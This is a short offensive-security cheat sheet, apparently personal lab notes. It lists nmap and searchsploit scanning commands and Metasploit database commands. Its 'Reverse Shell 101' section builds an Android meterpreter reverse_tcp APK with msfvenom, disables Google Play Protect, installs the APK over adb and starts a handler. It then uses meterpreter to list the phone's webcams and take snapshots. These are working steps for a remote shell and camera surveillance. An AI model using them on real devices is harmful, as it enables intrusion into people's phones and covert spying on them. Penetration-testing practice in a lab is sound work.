# OffSec  
  
## Network Analysis  

nmap -sn 192.168.1.*  
nmap {ips} -A -oX hosts.xml  
searchsploit --nmap hosts.xml --json 2>&1 | tee result.json  
  
nmap -T4 -A -v 192.168.1.1 -sV -oX hosts.xml  
searchsploit --nmap hosts.xml --json | tee router_hosts.json  
  
- Wireshark deauth packages Filter:  
wlan.fc.type_subtype == 12  

## MSF Reverse Shell 101  

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.126 LPORT=4444 -o android_client.apk  
  
disable Google Protect  
adb connect 192.168.110.230  
adb push android_client.apk /storage/self/primary  
  
msfconsole  
set PAYLOAD multi/handler  
set LHOST 192.168.110.126  
set LPORT 4444  
exploit  
  
Meterpreter:  
webcam_list  
webcam_snap  
  
MSF ddbb:  
systemctl start postgresql  
msfdb init  
db_status  
  
MSF Workspaces:  
list -> workspace  
select -> workspace msfu  
create -> workspace -a lab1  
delete -> workspace -d lab1  
  
Other:  
dp_nmap -A 192.168.1.1  
db_import /root/msfu/nmapScan  
hosts (display scan)  
hosts -c address,os_flavor -S Linux (-c FILTER, -S search)  
  
Backup  
db_export -f xml /root/msfu/Exported.xml  
